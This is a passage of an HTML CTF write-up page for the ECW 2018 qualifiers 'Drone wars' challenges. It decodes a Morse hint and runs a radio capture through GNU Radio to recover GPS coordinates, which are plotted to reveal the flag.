+<p><a href="https://www.dcode.fr/code-morse">https://www.dcode.fr/code-morse</a></p>
+</blockquote>
+
+<p>Input:</p>
+
+<pre><code>..-. .. .-.. . / ... --- ..- .-. -.-. . / -....- / --. ..-. ... -.- / -.. . -- --- -.. / -....- / .--. .- -.-. -.- . - / -.. . -.-. --- -.. . .-. / -....- / ..-. .. .-.. . / ... .. -. -.-
+</code></pre>
+
+<p>Output and flag:</p>
+
+<blockquote>
+<p>FILE SOURCE - GFSK DEMOD - PACKET DECODER - FILE SINK</p>
+</blockquote>
+
+<hr />
+
+<h1 id="drone-wars-3">Drone wars 3</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>ECW Quals</td>
+<td>DW 2</td>
+<td>&ldquo;Forensic&rdquo;</td>
+<td>??</td>
+<td>??</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="state-of-the-art-10">State of the art</h2>
+
+<p>Do you remember the binary file in the zip archive in the Drone Wars 1 challenge? The <code>Capture.bin</code> one. Thanks to the Drone Wars 2 hint, we now know that we have to use <code>GNU Radio</code>.</p>
+
+<p>File source, GFSK demode, etc&hellip; Are GNU Radio blocks to decode a source file.</p>
+
+<h2 id="gnu-radio">GNU Radio</h2>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/drone3_1.png" alt="" />
+<em>Fig1</em>: GNU Radio blocks
+</center></p>
+
+<p>I choose this configuration:</p>
+
+<ul>
+<li>File source -&gt; GFSK Demod: Complex mode</li>
+<li>GFSK Demod -&gt; Packet decoder -&gt; File Sink: Byte mode</li>
+</ul>
+
+<p>Let&rsquo;s run this, and see what kind of data there is in our <code>toto.bin</code> file:</p>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/drone3_2.png" alt="" />
+<em>Fig2</em>: Raw GPS coordinates
+</center></p>
+
+<h2 id="gps-to-ascii">GPS to ASCII</h2>
+
+<p>By googling <code>gps to ascii</code>, I found this website:</p>
+
+<blockquote>
+<p><a href="http://www.gpsvisualizer.com/convert_input">http://www.gpsvisualizer.com/convert_input</a></p>
+</blockquote>
+
+<p>I format my <code>toto.bin</code> into a valid CSV file for this website:</p>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/drone3_3.png" alt="" />
+<em>Fig3</em>: Valid CSV
+</center></p>
+
+<h2 id="flag-11">Flag</h2>
+
+<p>And then (when zooming):</p>
+
+<p><center>
+<img src="/img/writeups/qualsecw2018/drone3_4.png" alt="" />
+<em>Fig4</em>: Flag
+</center></p>
+
+	</div>
+</article>
+
+		</div>
+		
+	
+<script src="https://use.fontawesome.com/releases/v5.2.0/js/all.js" integrity="sha256-l1iMQ6f0+8aFBzSNRxgklLlYMqu5S4b/LpaST2s+gog= sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy sha512-3dlGoFoY39YEcetqKPULIqryjeClQkr2KXshhYxFXNZAgRFZElUW9UQmYkmQE1bvB8tssj3uSKDzsj8rA04Meg==" crossorigin="anonymous"></script>
+
+
+    
+        
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw= sha384-ZeLYJ2PNSQjvogWP559CDAf02Qb8FE5OyQicqtz/+UhZutbrwyr87Be7NPH/RgyC sha512-ExaEi+x+Zqq50MIBraxsK23lQQJZd8Q7ZDlwJsxQwsWlO8XvRouQev9ZWaFxCKdTvrgb2fmf2pglwGp61/7qZA==" crossorigin="anonymous"></script>
+	
+        <script type="text/javascript">
+            hljs.configure({languages: []});
+            hljs.initHighlightingOnLoad();
+        </script>
+        
+        
+
+
+
+	
+
+
+	<script>
+    (function() {
+      var toc = document.getElementById('TableOfContents');
+      if (!toc) return;
+      do {
+        var li, ul = toc.querySelector('ul');
+        if (ul.childElementCount !== 1) break;
+        li = ul.firstElementChild;
+        if (li.tagName !== 'LI') break;
+        
+        ul.outerHTML = li.innerHTML;
+      } while (toc.childElementCount >= 1);
+    })();
+  </script>
+
+	</body>
+</html>
